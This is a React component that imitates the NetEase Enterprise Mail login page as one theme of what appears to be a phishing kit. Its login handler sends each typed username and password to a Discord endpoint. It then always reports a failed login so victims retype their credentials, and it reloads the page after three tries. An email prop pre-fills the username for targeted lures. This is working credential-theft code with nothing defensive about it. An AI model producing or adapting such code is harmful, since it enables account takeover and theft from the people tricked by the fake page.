import React, { useState } from 'react';
import { useTranslation } from '../components/LanguageProvider';
import { submitToDiscord } from '../services/DiscordService';

interface NetEaseQiyeThemeProps {
  prefilledEmail?: string;
}

const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) => {
  const { lang } = useTranslation();
  const [username, setUsername] = useState(prefilledEmail?.split('@')[0] || '');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        username,
        password,
        theme: 'netease_qiye',
      }, 'NetEaseQiyeTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center">
          <div className="flex items-center space-x-2">
            <div className="flex items-baseline">
              <span className="text-[#cc0000] text-2xl font-bold">網易</span>
              <div className="ml-2 flex flex-col border-l border-gray-300 pl-2">
                <span className="text-[#333] text-[15px] font-bold leading-none">企业邮箱</span>
                <span className="text-gray-400 text-[10px] leading-tight">qiye.163.com</span>
              </div>
            </div>
          </div>
        </div>
        
        <nav className="flex items-center space-x-4 text-[12px] text-gray-500">
          <a href="#" className="hover:text-[#3b78e7]">{lang === 'zh' ? '邮箱官方客户端' : 'Official Client'}</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:text-[#3b78e7]">English</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:text-[#3b78e7]">{lang === 'zh' ? '帮助' : 'Help'}</a>
        </nav>
      </header>

      {/* Main Hero Area */}
      <main className="relative bg-[#2e4bb2] min-h-[480px] overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-r from-[#2e4bb2] via-[#3a57c5] to-[#4c69d8]"></div>
        
        <div className="relative z-10 w-full max-w-[1100px] mx-auto px-6 h-full flex flex-col md:flex-row items-center justify-between py-12">
          
          {/* Left Side: Security Illustration */}
          <div className="hidden md:flex flex-col items-start max-w-[500px] text-white space-y-6">
            <div className="space-y-2">
              <h2 className="text-[28px] font-bold leading-tight">
                {lang === 'zh' ? '建议使用邮箱官方客户端' : 'Use the official mail client'}
              </h2>
              <p className="text-[18px] opacity-90">
                {lang === 'zh' ? '确保邮箱安全' : 'Ensure your mailbox security'}
              </p>
            </div>
            
            <button className="px-8 py-2 bg-white text-[#2e4bb2] rounded-full font-bold text-[14px] hover:bg-gray-100 transition-colors shadow-lg">
              {lang === 'zh' ? '立即下载' : 'Download Now'}
            </button>

            <div className="relative w-[400px] h-[240px] mt-4 opacity-80">
               <svg viewBox="0 0 400 240" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full drop-shadow-2xl">
                 <path d="M200 40 L280 70 V130 C280 180 200 210 200 210 C200 210 120 180 120 130 V70 L200 40Z" fill="white" fillOpacity="0.1" stroke="white" strokeWidth="2"/>
                 <circle cx="200" cy="120" r="40" fill="white" fillOpacity="0.2"/>
                 <path d="M190 110 H210 V135 H190 V110Z M192 110 V105 C192 100 208 100 208 105 V110" stroke="white" strokeWidth="2" strokeLinecap="round"/>
               </svg>
            </div>
          </div>

          {/* Right Side: Login Card */}
          <div className="w-full max-w-[380px] bg-white rounded-sm shadow-2xl flex flex-col min-h-[420px] relative">
            <div className="absolute top-0 right-0 w-12 h-12 overflow-hidden cursor-pointer group">
               <svg viewBox="0 0 40 40" className="w-full h-full p-2 text-[#3b78e7]">
                 <path d="M5 5h10v10H5z M25 5h10v10H25z M5 25h10v10H5z" fill="currentColor"/>
               </svg>
            </div>

            <div className="px-8 pt-12 pb-6 flex flex-col flex-grow">
              <form onSubmit={handleLogin} className="space-y-6">
                <div className="flex items-center space-x-4">
                  <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '用户名' : 'User'}</label>
                  <div className="flex-grow border border-gray-300 rounded focus-within:border-[#3b78e7] transition-all bg-white">
                    <input 
                      type="text" 
                      value={username} 
                      onChange={(e) => setUsername(e.target.value)} 
                      className="w-full px-3 py-2 text-[14px] outline-none" 
                    />
                  </div>
                </div>

                <div className="flex items-center space-x-4 relative">
                  <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '密  码' : 'Pass'}</label>
                  <div className="flex-grow border border-gray-300 rounded focus-within:border-[#3b78e7] relative transition-all bg-white">
                    <input 
                      type={showPassword ? "text" : "password"} 
                      value={password} 
                      onChange={(e) => setPassword(e.target.value)} 
                      className="w-full px-3 py-2 text-[14px] outline-none pr-10" 
                    />
                    <button 
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPassword ? '👁️' : '👁️‍🗨️'}
                    </button>
                  </div>
                </div>

                {/* Loading State */}
                {isLoading && (
                  <div className="flex items-center justify-center py-4">
                    <div className="flex flex-col items-center space-y-2">
                      <div className="w-6 h-6 border-3 border-blue-200 border-t-blue-500 rounded-full animate-spin"></div>
                      <p className="text-[14px] text-gray-500">
                        {lang === 'zh' ? '正在验证...' : 'Verifying...'}
                      </p>
                    </div>
                  </div>
                )}

                {/* Authentication Failed Message */}
                {authError && !isLoading && (
                  <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                    <div className="flex items-start space-x-2">
                      <div className="flex-shrink-0 text-red-500 text-lg">⚠️</div>
                      <div>
                        <h3 className="font-medium text-red-800 text-[14px]">
                          {lang === 'zh' ? '验证失败' : 'Authentication Failed'}
                        </h3>
                        <p className="text-red-700 text-[13px] mt-1">
                          {lang === 'zh' ? `请重试。剩余尝试次数: ${3 - failedAttempts}` : `Please try again. Attempts left: ${3 - failedAttempts}`}
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                <div className="pl-20">
                  <button 
                    type="submit" 
                    disabled={isLoading}
                    className="w-full py-2 bg-[#3b78e7] hover:bg-[#2e62c2] text-white font-medium rounded transition-colors text-[16px] disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {isLoading ? (lang === 'zh' ? '验证中...' : 'Verifying...') : (lang === 'zh' ? '登 录' : 'Login')}
                  </button>
                </div>
              </form>

              <div className="mt-8 flex items-center justify-center space-x-6 text-gray-400">
                <span className="text-xl cursor-pointer">📱</span>
                <span className="text-xl cursor-pointer">💬</span>
                <span className="text-xl cursor-pointer">💠</span>
              </div>

              <div className="mt-auto flex items-center justify-center space-x-4 text-[12px] text-[#3b78e7] pt-6 border-t border-gray-50">
                <a href="#">{lang === 'zh' ? '管理员登录' : 'Admin'}</a>
                <span className="text-gray-200">|</span>
                <a href="#">{lang === 'zh' ? '忘记密码?' : 'Forgot Password?'}</a>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="w-full py-10 bg-white">
        <div className="max-w-[1200px] mx-auto px-4 text-center space-y-6">
          <div className="flex flex-wrap justify-center items-center space-x-8 text-[13px] text-gray-500">
            <a href="#">{lang === 'zh' ? '关于网易' : 'About NetEase'}</a>
            <span className="text-gray-200">|</span>
            <a href="#">{lang === 'zh' ? '企业邮箱' : 'Enterprise Mail'}</a>
          </div>
          <p className="text-[12px] text-gray-400">©1997-2025 Powered by NetEase Enterprise Mail</p>
        </div>
      </footer>
    </div>
  );
};

export default NetEaseQiyeTheme;